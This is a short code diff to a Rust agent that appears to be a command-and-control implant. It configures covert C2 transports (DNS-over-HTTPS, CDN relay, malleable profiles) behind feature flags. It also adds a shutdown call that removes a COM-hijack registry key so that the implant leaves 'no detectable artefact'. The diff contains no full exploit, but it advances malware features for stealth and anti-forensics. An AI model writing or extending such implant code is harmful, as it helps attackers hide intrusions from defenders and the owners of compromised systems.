@@ -204,21 +204,27 @@ impl Agent {
             log::debug!("Evasion layers applied");
         }
 
-        // Warn when experimental transports are configured but still inactive.
+        // Warn when experimental transports are configured but the corresponding
+        // feature flag is not compiled in.
         {
+            #[allow(unused_variables)]
             let cfg = self.config.lock().await;
+            #[cfg(not(feature = "doh-transport"))]
             if cfg.malleable_profile.dns_over_https {
                 log::warn!(
-                    "dns_over_https is set in config but the DoH transport (c2_doh) is \
-                     EXPERIMENTAL and not active in this build. Traffic still uses the \
-                     default TLS transport."
+                    "dns_over_https=true in config but the `doh-transport` feature is not \
+                     compiled in. Traffic still uses the default TLS transport. \
+                     Rebuild with --features doh-transport to enable DohTransport. \
+                     NOTE: a server-side DoH listener is required and is not included \
+                     in this release."
                 );
             }
+            #[cfg(not(feature = "http-transport"))]
             if cfg.malleable_profile.cdn_relay {
                 log::warn!(
-                    "cdn_relay is set in config but the HTTP malleable transport (c2_http) is \
-                     EXPERIMENTAL and not active in this build. Traffic still uses the \
-                     default TLS transport."
+                    "cdn_relay=true in config but the `http-transport` feature is not \
+                     compiled in. Traffic still uses the default TLS transport. \
+                     Rebuild with --features http-transport to enable HttpTransport."
                 );
             }
         }
@@ -254,6 +260,10 @@ impl Agent {
                 res = msg_fut => res,
                 _ = crate::handlers::SHUTDOWN_NOTIFY.notified() => {
                     info!("Shutdown signal received, draining tasks and shutting down.");
+                    // Clean up the COM-hijack registry key if the stealth layer
+                    // applied it — leave no detectable artefact after exit.
+                    #[cfg(all(windows, feature = "stealth"))]
+                    crate::amsi_defense::cleanup_com_hijack();
                     break;
                 }
             };
@@ -293,6 +303,8 @@ impl Agent {
                 }
                 Ok(Message::Shutdown) => {
                     info!("Shutdown received, exiting.");
+                    #[cfg(all(windows, feature = "stealth"))]
+                    crate::amsi_defense::cleanup_com_hijack();
                     break;
                 }
                 Ok(Message::ModulePush {
